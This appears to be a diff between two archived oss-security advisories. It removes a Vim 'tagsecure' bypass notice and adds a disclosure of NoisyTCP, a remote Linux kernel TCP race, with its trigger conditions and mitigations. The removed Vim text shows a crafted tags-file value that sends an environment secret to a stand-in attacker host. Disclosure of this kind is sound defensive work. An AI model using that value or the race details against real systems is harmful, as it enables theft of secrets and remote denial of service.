@@ -1,66 +1,109 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/11/15/3
-Message-ID: <avnOlkWVZSWoEDrg@256bit.org>
-Date: Sun, 15 Nov 2026 16:24:06 +0100
-From: Christian Brabandt <cb@...bit.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/11/15/2
+Message-ID: <avnXBHKfNKnqmDij@v4bel>
+Date: Mon, 16 Nov 2026 01:00:04 +0900
+From: Hyunwoo Kim <imv4bel@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: [vim-security] 'tagsecure' Bypass via Escaped URL in Tags File in Vim  < 9.2.1352
+Cc: imv4bel@...il.com
+Subject: NoisyTCP: Linux Kernel TCP Pre-auth Remote Corruption (CVE-2026-99288)
 Content-Type: text/plain; charset=utf-8
 
-'tagsecure' Bypass via Escaped URL in Tags File in Vim  < 9.2.1352
-==================================================================
+The embargo agreed with the maintainers of
+linux-distros@...openwall.org has expired, so I am posting this report.
 
-Date: 15.11.2026
-Severity: Low
-CVE: *requested, not yet assigned*
-CWE: Incomplete List of Disallowed Inputs (CWE-184)
+# Abstract
 
-## Summary
+This report is a security advisory for NoisyTCP (CVE-2026-99288), the
+Linux Kernel TCP Pre-auth Remote Corruption vulnerability reported
+and patched by Hyunwoo Kim (@v4bel).
 
-Patch 9.2.0405 made Vim refuse a file name in a tags file that is a URL;
-patch 9.2.0497 made this configurable with the 'tagsecure' option.  The check
-is done before the file name is expanded.  A file name with escaped slashes
-like `http:\/\/` therefore passes the check and is then opened as a URL by
-the netrw plugin.
+To trigger this vulnerability, a stale ehash lookup and the freeing and
+reallocation of an existing request socket must proceed concurrently in
+different RX contexts. Packet processing has to be spread out by using
+the difference in receive hash between IPv4 fragments and regular TCP
+packets, so it can be triggered against servers that have two or more
+RX queues, or where RPS distributes packets across multiple CPUs.
 
-## Description
+That is, since this vulnerability can be triggered against "plain"
+TCP listeners, it can be triggered pre-auth and remotely against
+servers that TCP packets sent by an attacker can reach directly, such
+as Nginx, Apache, and SSH servers running with their "default"
+configuration.
 
-When jumping to a tag, `expand_tag_fname()` rejects the file field of the
-tag entry if it is a URL and 'tagsecure' is set.  Afterwards, a file field
-containing wildcards or environment variables is expanded, which removes
-backslashes and expands `$VAR`.  A file field like:
+# Trigger Flows
 
-    http:\/\/attacker.example/$SECRET/x*
+There are two trigger flows for this vulnerability, and an attacker
+can arbitrarily choose either one to trigger it.
 
-is not recognized as a URL, but expands to
-`http://attacker.example/<value of $SECRET>/x*`, which netrw then fetches.
+## 1. request_sock Reuse ABA Race
 
-## Impact
+While a stale lookup has found an existing request socket, another RX
+context frees it and reallocates a SYN cookie request with the same
+tuple at the same slab address.
 
-A network request to an attacker-controlled host, which may contain the
-values of environment variables.  Exploitation requires:
+The stale lookup acquires a refcount on the new object and then even
+passes the tuple recheck, but the new request has no listener attached
+to it. After that, the TCP receive path dereferences the NULL listener,
+which causes a kernel panic.
 
-- Vim with the netrw plugin enabled
-- the victim using a crafted tags file, e.g. from a cloned repository, and
-  jumping to a tag from it.
+In the end, a remote DoS can be triggered.
 
-The severity is rated Low because no command execution is possible and
-leaking environment variables requires the attacker to guess their names.
+Because this is a Linux kernel TCP vulnerability, if the DoS is
+triggered against a web server running in a container, it takes down
+not only the web server application but the entire host.
 
-## Acknowledgements
+## 2. Full child socket ABA Race
 
-The Vim project would like to thank Zachariah Mithani for reporting the issue.
+This path can trigger a remote use-after-free, but since complex race
+scenarios have to succeed in a nested way, it is generally hard to
+trigger without using special techniques.
 
-## References
+# Trigger Characteristics
 
-The issue has been fixed as of Vim patch [v9.2.1352](https://github.com/vim/vim/releases/tag/v9.2.1352).
+To trigger this vulnerability, another RX context has to get in
+between the first tuple check and the refcount acquisition. Because of
+this, against bare-metal servers, especially quiet servers with little
+execution variance and contention, triggering the race can take a long
+time.
 
-- [Commit](https://github.com/vim/vim/commit/8da4660cf4068e6812b4eacdf78c8b05c7774d9a)
-- [Github Security Advisory](https://github.com/vim/vim/security/advisories/GHSA-j6wv-2276-36jq)
+Against Nginx, Apache, and SSH servers running with their default
+configuration on VMs such as QEMU/KVM, where vCPU preemption can occur,
+it took about 5 seconds to 2 minutes to trigger.
 
-Best,
-Christian
--- 
-Mancher hat nach der Antike studiert und sich ihr Wesen nicht
-ganz zugeeignet. Ist er darum scheltenswert?
-		-- Goethe, Maximen und Reflektionen, Nr. 1145
+Against Nginx running with its default configuration on a quiet
+bare-metal server (8 RX queues), it took about 14 hours to trigger,
+even though a PoC with race timing carefully tuned for the target
+environment was used.
+
+# Affected Versions
+
+The affected range of NoisyTCP (CVE-2026-99288) is as follows.
+
+Introduced: 079096f103fa (2015-10-03)
+Fixed: 4e2b3ef19e0e (2026-11-03)
+
+That is, this vulnerability had been latent in the Linux kernel for
+about "11 years" and affects almost all Linux distributions.
+
+# Mitigations
+
+Applying the 4e2b3ef19e0e patch is the priority, but if it is difficult
+to apply it immediately, one of the following temporary mitigations can
+be used.
+
+## 1. Disable SYN cookies
+
+This blocks the path where a request socket is reconstructed through a
+SYN cookie.
+
+  sudo sysctl -w net.ipv4.tcp_syncookies=0
+
+This setting is managed per network namespace. It has to be applied to
+"each" container that uses a separate network namespace. Disabling it
+lowers the protection against SYN floods.
+
+## 2. Serialize to a single RX queue
+
+This vulnerability requires different RX contexts to race
+concurrently. Reducing the RX queues of the interface where external
+packets come in to one and disabling RPS and RFS can block the race.
